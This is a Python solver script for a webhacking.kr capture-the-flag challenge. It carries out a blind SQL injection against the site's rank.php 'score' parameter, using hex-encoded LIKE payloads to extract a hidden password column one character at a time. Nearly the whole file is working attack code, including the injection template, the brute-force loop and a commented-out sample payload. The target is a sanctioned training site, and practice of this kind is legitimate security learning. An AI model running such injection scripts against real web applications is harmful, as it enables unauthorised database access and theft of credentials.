import requests
import string

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)


URL = "https://webhacking.kr/challenge/web-31/rank.php"
SESSION_ID = "1234"
cookies = {'PHPSESSID':SESSION_ID}
params ={'score':""}


password = "FLAG{easy_peasy_lemon_squeezy"
i = len(password)+1
while True:    
    for c in "_"+string.ascii_letters+string.digits+"}"+"{"+"-"+"?" +'!':
        hex = string_to_hex((password+c).replace("_", r"\_"))
        payload = f"770 and left(p4ssw0rd_1123581321 ,{i})like(0x{hex})#)"
        print(f"{c}: {payload}")
        params["score"] = payload 
        response = requests.get(URL, params=params, cookies=cookies)
        if "770" in response.text:
            i += 1
            password += c
            print(password)
            break
    

# ?score=770%20or%20left(id,4)like(0x61646D69)#6E)"
# url_res = "https://webhacking.kr/challenge/web-31/rank.php"
# params = {'score':'1'}
# response = requests.get(url_res, params=params, cookies=cookies)
# print(response.text)
